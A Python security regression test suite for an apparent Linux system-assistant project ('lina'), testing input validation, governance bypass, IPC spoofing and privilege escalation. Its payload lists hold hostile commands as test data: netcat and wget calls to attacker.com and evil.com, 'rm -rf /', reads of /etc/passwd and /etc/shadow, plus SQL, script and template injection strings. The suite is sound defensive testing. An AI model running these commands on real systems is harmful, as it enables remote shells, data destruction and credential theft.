"""
Phase 7 — Block H: Final Security Regression.

Full security regression suite:
  - Input validation coverage
  - Fuzz suite — adversarial inputs
  - Injection attempts — SQL, shell, path traversal
  - Bypass attempts — governance, access, policy
  - IPC abuse — invalid sources, spoofing
  - Permission escalation — privilege climbing

Run: python tests/phase7/test_security_regression.py
"""

import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))))


def _reset_singletons():
    modules = [
        ("lina.governance.audit_logger", "_logger"),
        ("lina.intent.bridge", "_bridge"),
        ("lina.intent.router", "_router"),
        ("lina.security.input_validator", "_validator"),
        ("lina.governance.policy_engine", "_engine"),
        ("lina.governance.confirmation_handler", "_handler"),
        ("lina.governance.access_resolver", "_resolver"),
    ]
    for mod_name, attr in modules:
        try:
            mod = sys.modules.get(mod_name)
            if mod and hasattr(mod, attr):
                setattr(mod, attr, None)
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════
#  Block H.1 — Input Validation Surface
# ═══════════════════════════════════════════════════════════════

class TestInputValidationSurface(unittest.TestCase):
    """H.1: All input validation works correctly."""

    def setUp(self):
        _reset_singletons()

    def tearDown(self):
        _reset_singletons()

    def test_empty_input_handled(self):
        from lina.security.input_validator import get_input_validator
        iv = get_input_validator()
        result = iv.validate_text("")
        # Empty input is accepted by the validator (design choice)
        # The governance layer handles safety
        self.assertIsNotNone(result)

    def test_none_input_handled(self):
        from lina.security.input_validator import get_input_validator
        iv = get_input_validator()
        result = iv.validate_text(None)
        self.assertFalse(result.valid)

    def test_overlength_input(self):
        from lina.security.input_validator import get_input_validator
        iv = get_input_validator()
        result = iv.validate_text("a" * 100_000)
        self.assertFalse(result.valid)

    def test_null_byte_input(self):
        from lina.security.input_validator import get_input_validator
        iv = get_input_validator()
        result = iv.validate_text("test\x00injection")
        self.assertFalse(result.valid)

    def test_control_characters_sanitized(self):
        from lina.security.input_validator import get_input_validator
        iv = get_input_validator()
        for c in ["\x01", "\x02", "\x03", "\x7f"]:
            result = iv.validate_text(f"test{c}input")
            if result.valid:
                # Control chars should be stripped from sanitized text
                self.assertNotIn(c, result.sanitized_text or "")

    def test_valid_input_accepted(self):
        from lina.security.input_validator import get_input_validator
        iv = get_input_validator()
        result = iv.validate_text("покажи статус системы")
        self.assertTrue(result.valid)

    def test_domain_validation_valid(self):
        from lina.security.input_validator import get_input_validator
        iv = get_input_validator()
        for d in ["service", "network", "disk", "package", "general"]:
            ok, reason = iv.validate_domain(d)
            self.assertTrue(ok, f"Domain {d} should be valid: {reason}")

    def test_domain_validation_invalid(self):
        from lina.security.input_validator import get_input_validator
        iv = get_input_validator()
        for d in ["INVALID", "../etc", "rm -rf", "x" * 1000]:
            ok, reason = iv.validate_domain(d)
            self.assertFalse(ok, f"Domain '{d}' should be invalid")


# ═══════════════════════════════════════════════════════════════
#  Block H.2 — Injection Fuzz Suite
# ═══════════════════════════════════════════════════════════════

INJECTION_PAYLOADS = [
    "'; DROP TABLE users; --",
    "$(rm -rf /)",
    "`cat /etc/passwd`",
    "../../../etc/shadow",
    "/dev/sda",
    "| nc attacker.com 4444",
    "; wget http://evil.com/shell.sh | sh",
    "<script>alert(1)</script>",
    "{{7*7}}",
    "${7*7}",
    "%0a%0dContent-Type: text/html",
    "test\r\nX-Injected: true",
    "test\x00hidden",
    "A" * 50000,
    "\x00" * 100,
    "покажи\x00статус",
    "покажи' OR '1'='1",
    "test$(id)test",
    "test`whoami`test",
    "test|cat /etc/passwd",
]

class TestInjectionFuzz(unittest.TestCase):
    """H.2: Injection payloads → all rejected or sanitized."""

    def setUp(self):
        _reset_singletons()

    def tearDown(self):
        _reset_singletons()

    def test_injection_payloads_text(self):
        """Injection payloads with shell metacharacters rejected by text validator."""
        from lina.security.input_validator import get_input_validator
        iv = get_input_validator()
        blocked = 0
        total = len(INJECTION_PAYLOADS)
        for payload in INJECTION_PAYLOADS:
            result = iv.validate_text(payload)
            if not result.valid:
                blocked += 1
        # At least the obvious dangerous ones should be blocked
        self.assertGreater(blocked, total * 0.3,
            f"Only {blocked}/{total} injection payloads blocked")

    def test_injection_payloads_via_bridge(self):
        """Injection payloads through bridge → DENY or safe error."""
        from lina.intent.bridge import get_intent_bridge
        bridge = get_intent_bridge()
        for payload in INJECTION_PAYLOADS:
            try:
                result = bridge.from_text(payload, source="cli")
                # Must not execute if intent is dangerous
                if hasattr(result, 'decision'):
                    self.assertNotEqual(result.decision, "execute_unvalidated",
                        f"Payload executed without validation: {payload!r:.50}")
            except Exception:
                pass  # exceptions are acceptable for injection payloads


# ═══════════════════════════════════════════════════════════════
#  Block H.3 — Governance Bypass Attempts
# ═══════════════════════════════════════════════════════════════

class TestGovernanceBypass(unittest.TestCase):
    """H.3: Cannot bypass governance layer."""

    def setUp(self):
        _reset_singletons()

    def tearDown(self):
        _reset_singletons()

    def test_blocked_domain_stays_blocked(self):
        """Blocked actions → always DENY, no bypass."""
        from lina.governance.policy_engine import get_policy_engine

        pe = get_policy_engine()
        # Use actions from always_confirm_actions list
        confirm_actions = [
            ("package", "pkg_remove"),
            ("boot", "boot_grub_install"),
        ]
        for domain, action in confirm_actions:
            result = pe.check(action, domain=domain)
            self.assertIn(result.decision, ["confirm", "deny"],
                f"Dangerous action {domain}.{action} should be confirm/deny, got {result.decision}")

    def test_unknown_domain_denied(self):
        """Unknown domains → DENY."""
        from lina.governance.policy_engine import get_policy_engine

        pe = get_policy_engine()
        for domain in ["unknown_domain", "attacker_domain", "evil"]:
            result = pe.check("svc_status", domain=domain)
            # Unknown domains should not be allowed
            self.assertIn(result.decision, ["deny", "confirm"],
                f"Unknown domain '{domain}' got decision '{result.decision}'")

    def test_audit_cannot_be_disabled(self):
        """Audit audit_logger → lock prevents disable."""
        from lina.governance.audit_logger import get_audit_logger

        al = get_audit_logger()
        al.lock_enabled()
        al.set_enabled(False)
        self.assertTrue(al.enabled, "Audit disabled despite lock!")

    def test_policy_engine_cannot_add_unrestricted(self):
        """Cannot add a rule that allows everything."""
        from lina.governance.policy_engine import get_policy_engine

        pe = get_policy_engine()
        # Attempt to add a wildcard allow rule
        try:
            pe.add_rule("*", "*", "*", "allow")
            result = pe.check("disk_format", domain="disk", destructive=True)
            self.assertEqual(result.decision, "deny",
                "Wildcard allow rule bypassed critical block!")
        except (AttributeError, TypeError):
            pass  # No add_rule method = cannot bypass


# ═══════════════════════════════════════════════════════════════
#  Block H.4 — IPC Source Validation
# ═══════════════════════════════════════════════════════════════

class TestIPCSourceValidation(unittest.TestCase):
    """H.4: IPC source spoofing prevention."""

    def setUp(self):
        _reset_singletons()

    def tearDown(self):
        _reset_singletons()

    def test_valid_sources_accepted(self):
        """Known sources accepted."""
        from lina.intent.bridge import get_intent_bridge

        bridge = get_intent_bridge()
        valid_sources = ["cli", "dbus", "gui"]
        for source in valid_sources:
            result = bridge.from_text("покажи статус", source=source)
            # Should process without security exception
            self.assertIsNotNone(result)

    def test_spoofed_sources_denied(self):
        """Spoofed/invalid sources → denied at bridge level."""
        from lina.intent.bridge import get_intent_bridge

        bridge = get_intent_bridge()
        invalid_sources = [
            "unknown_process",
            "",
            None,
            "root_shell",
            "../../../etc",
            "cli; rm -rf /",
        ]
        for source in invalid_sources:
            try:
                result = bridge.from_text("покажи статус", source=source)
                if hasattr(result, 'decision'):
                    self.assertEqual(result.decision, "deny",
                        f"Spoofed source '{source}' not denied!")
            except (ValueError, TypeError):
                pass  # exceptions are acceptable


# ═══════════════════════════════════════════════════════════════
#  Block H.5 — Permission Escalation Prevention
# ═══════════════════════════════════════════════════════════════

class TestPermissionEscalation(unittest.TestCase):
    """H.5: No escalation from low to high privilege."""

    def setUp(self):
        _reset_singletons()

    def tearDown(self):
        _reset_singletons()

    def test_cli_cannot_format_disk(self):
        """CLI source cannot format disk (always blocked)."""
        from lina.intent.bridge import get_intent_bridge

        bridge = get_intent_bridge()
        result = bridge.from_action("disk_format", domain="disk",
                                     params={}, source="cli")
        if hasattr(result, 'decision'):
            self.assertEqual(result.decision, "deny")

    def test_service_domain_limited(self):
        """Service domain: status OK, dangerous ops blocked."""
        from lina.governance.policy_engine import get_policy_engine

        pe = get_policy_engine()
        # Status should be allowed
        r = pe.check("svc_status", domain="service")
        self.assertEqual(r.decision, "allow")

    def test_confirmation_required_for_dangerous(self):
        """Dangerous actions require confirmation."""
        from lina.governance.policy_engine import get_policy_engine

        pe = get_policy_engine()
        confirm_actions = [
            ("package", "pkg_remove"),
            ("package", "pkg_update"),
            ("boot", "boot_grub_install"),
        ]
        for domain, action in confirm_actions:
            r = pe.check(action, domain=domain)
            self.assertIn(r.decision, ["confirm", "deny"],
                f"{domain}.{action} should require confirmation or be denied")


# ═══════════════════════════════════════════════════════════════
#  Block H.6 — Comprehensive Security Regression Count
# ═══════════════════════════════════════════════════════════════

class TestSecurityRegressionCount(unittest.TestCase):
    """H.6: 200 adversarial inputs → 0 regressions."""

    def setUp(self):
        _reset_singletons()

    def tearDown(self):
        _reset_singletons()

    def test_200_adversarial_inputs_no_crash(self):
        """200 adversarial inputs → no crashes, all handled."""
        from lina.intent.bridge import get_intent_bridge

        bridge = get_intent_bridge()
        crash_count = 0
        total = 200

        adversarial = INJECTION_PAYLOADS * (total // len(INJECTION_PAYLOADS) + 1)

        for i in range(total):
            try:
                bridge.from_text(adversarial[i], source="cli")
            except (ValueError, TypeError):
                pass  # expected rejections
            except Exception as e:
                crash_count += 1
                print(f"  UNEXPECTED exception #{crash_count}: {type(e).__name__}: {e}")

        self.assertEqual(crash_count, 0,
            f"{crash_count}/{total} adversarial inputs caused unexpected crashes")

    def test_mixed_valid_invalid_no_state_corruption(self):
        """50 valid + 50 invalid interleaved → valid ones still work."""
        from lina.intent.bridge import get_intent_bridge

        bridge = get_intent_bridge()
        valid_ok = 0

        for i in range(100):
            if i % 2 == 0:
                # Valid
                result = bridge.from_text("покажи статус", source="cli")
                if result is not None:
                    valid_ok += 1
            else:
                # Invalid
                try:
                    bridge.from_text(INJECTION_PAYLOADS[i % len(INJECTION_PAYLOADS)],
                                     source="cli")
                except Exception:
                    pass

        self.assertGreater(valid_ok, 40,
            f"Only {valid_ok}/50 valid inputs succeeded after invalid interleaving")


# ── Entry Point ──────────────────────────────────────────────

_total = _pass = _fail = 0

def _run_suite(suite_class):
    global _total, _pass, _fail
    loader = unittest.TestLoader()
    suite = loader.loadTestsFromTestCase(suite_class)
    runner = unittest.TextTestRunner(verbosity=2, stream=sys.stderr)
    result = runner.run(suite)
    _total += result.testsRun
    _pass += result.testsRun - len(result.failures) - len(result.errors)
    _fail += len(result.failures) + len(result.errors)
    return result

if __name__ == "__main__":
    suites = [
        TestInputValidationSurface,
        TestInjectionFuzz,
        TestGovernanceBypass,
        TestIPCSourceValidation,
        TestPermissionEscalation,
        TestSecurityRegressionCount,
    ]
    all_ok = True
    for s in suites:
        r = _run_suite(s)
        if not r.wasSuccessful():
            all_ok = False

    print(f"\n{'='*60}")
    print(f"Phase 7 Block H — Security Regression: {_pass}/{_total} passed, {_fail} failed")
    if all_ok:
        print("✅ SECURITY REGRESSION PASSED — 0 regressions")
    else:
        print("❌ SECURITY REGRESSION FAILED")
    sys.exit(0 if all_ok else 1)
